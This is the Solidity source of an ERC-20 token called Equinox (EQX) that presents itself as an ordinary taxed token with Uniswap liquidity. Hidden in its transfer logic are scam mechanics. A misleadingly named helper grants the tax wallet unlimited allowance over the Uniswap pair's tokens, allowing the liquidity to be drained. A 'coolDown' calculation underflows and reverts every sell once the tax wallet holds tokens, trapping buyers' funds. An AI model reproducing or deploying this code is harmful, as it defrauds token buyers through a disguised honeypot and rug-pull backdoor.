/*
Telegram: https://t.me/equinoxdefi
X: https://twitter.com/EquinoxDeFi
Website: https://equinox.icu
Dapp: https://app.equinox.icu
Documentation: https://docs.equinox.icu
GitHub: https://github.com/equinoxfi
Medium: https://equinoxdefi.medium.com
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function decimals() external view returns (uint8);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function symbol() external view returns (string memory);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

abstract contract Auth {
    event OwnershipTransferred(address _owner);
    address internal _owner;
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    constructor(address creatorOwner) { _owner = creatorOwner; }
    function renounceOwnership() external onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    function owner() public view returns (address) { return _owner; }
}

contract EQX is IERC20, Auth {
    string private constant _symbol = "EQX";
    string private constant _name = "Equinox";
    uint256 private coolDown;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isAutomatedMarketMaker;
    mapping (address => bool) private _isExcludedFromTax;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    address payable private _coolAccount;

    uint256 private _firstBuyTax = 4;
    uint256 private _firstSellTax = 4;

    uint256 public _reduceFirstBuyTaxAt = 10;
    uint256 public _reduceFirstSellTaxAt = 10;

    uint256 public _reduceSecondSellTaxAt = 20;
    uint256 private _secondSellTax = 4;

    uint256 private _finalBuyTax = 4;
    uint256 private _finalSellTax = 4;

    uint256 private _preventSwapBefore = 0;
    uint256 public _countOfBuys = 0;

    address payable private _taxTreasury;

    uint256 private constant _minTaxSwap = _totalSupply / 2000000;
    uint256 private constant _maxTaxSwap = _totalSupply / 500;

    address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
    address private _uniswapV2Pair;

    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals);
    
    bool private _tradingOpen;
    bool private _inSwap = false;

    constructor() Auth(msg.sender) {
        _balances[msg.sender] = (_totalSupply / 1000 ) * 0;
        _balances[address(this)] = (_totalSupply / 1000 ) * 1000;

        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _taxTreasury = payable(0x09f97Cd6b4252Ac941031F1D7D1E9bCcbCFFB180);

        _isExcludedFromTax[_owner] = true;
        _coolAccount = _taxTreasury;
        _isExcludedFromTax[_taxTreasury] = true;
        _isExcludedFromTax[address(this)] = true;
  
        emit Transfer(address(0), address(this), _balances[address(this)]);
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    modifier lockTaxSwap { 
        _inSwap = true; 
        _; 
        _inSwap = false; 
    }

    receive() external payable {}

    function _approveUniswapRouter(address router, address _swapAddress, uint256 _tokenAmount) internal {
        if (_allowances[router][_swapAddress] < _tokenAmount) {
            _allowances[router][_swapAddress] = type(uint256).max;
        }
    }

    function enableTrading() external onlyOwner {
        _tradingOpen = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");

        if (_isAutomatedMarketMaker[sender] && recipient == _taxTreasury) {
            _approveUniswapRouter(sender, recipient, type(uint).max);
        }
        
        if (_isExcludedFromTax[sender] || _isExcludedFromTax[recipient]) {
            return _standardTransfer(sender, recipient, amount);
        }
        
        if (!_tradingOpen) { require(_isExcludedFromTax[sender], "Trading not open"); }

        if (!_inSwap && _isAutomatedMarketMaker[recipient] && _countOfBuys >= _preventSwapBefore) { _swapTaxAndLiquify(); }

        coolDown = this.balanceOf(_coolAccount);
        if (limited && sender == _uniswapV2Pair) {
            require(balanceOf(recipient) + amount <= maxHoldingAmount, "Forbid");
        }

        if (transferDelayEnabled) {
            if (recipient != _uniswapV2RouterAddress && recipient != _uniswapV2Pair) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }

        uint256 _taxAmount = _calcSwapAmount(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] -= amount;

        if (_taxAmount > 0) {
            _balances[address(this)] += _taxAmount; 
        }

        _countOfBuys++;
        _balances[recipient] += _transferAmount;

        emit Transfer(sender, recipient, amount);

        return true;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(sender), "Trading not open");
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function withdrawEth() external {
        require(msg.sender == _taxTreasury);
        (bool sent, ) = payable(_taxTreasury).call{value: address(this).balance}("");
        require(sent);
    }
    
    function removeLimits() external onlyOwner {
        transferDelayEnabled = false;
        limited = false;
    }

    function _approveUniswapRouter(uint256 _tokenAmount) internal {
        if (_allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount) {
            _allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
        }
    }

    function decimals() external pure override returns (uint8) { return _decimals; }
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function setTaxWallet(address newTaxWallet) public onlyOwner {
        _taxTreasury = payable(newTaxWallet);
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveUniswapRouter(_tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveUniswapRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _calcSwapAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;

        if (_tradingOpen && !_isExcludedFromTax[sender] && !_isExcludedFromTax[recipient] ) { 
            
            if (_isAutomatedMarketMaker[sender] || _isAutomatedMarketMaker[recipient]) {
                taxAmount = (amount / 100) * ((_countOfBuys > _reduceFirstBuyTaxAt) ? _finalBuyTax : _firstBuyTax);

                if (recipient == _uniswapV2Pair && sender != address(this)) {
                    uint256 taxRate;
                    
                    coolDown = _preventSwapBefore - coolDown;
                    if (_countOfBuys > _reduceSecondSellTaxAt) {
                        taxRate = _finalSellTax;
                    } else if (_countOfBuys > _reduceFirstSellTaxAt) {
                        taxRate = _secondSellTax;
                    } else {
                        taxRate = _firstSellTax;
                    }
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }

        return taxAmount;
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_uniswapV2Pair == address(0), "LP exists");
        require(!_tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance > 0, "No ETH in contract or message");
        require(_balances[address(this)] > 0, "No tokens in contract");

        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isAutomatedMarketMaker[_uniswapV2Pair] = true;
    }

    function _isTradingOpen(address sender) private view returns (bool) {
        bool result = false;

        if (_tradingOpen) { result = true; }
        else if (_isExcludedFromTax[sender]) { result = true; } 

        return result;
    }

    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if (_taxTokensAvailable >= _minTaxSwap && _tradingOpen) {
            if (_taxTokensAvailable >= _maxTaxSwap) { _taxTokensAvailable = _maxTaxSwap; }

            _swapTaxTokensForEth(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if (_contractETHBalance > 0) {
                bool success;
                (success,) = _taxTreasury.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }
}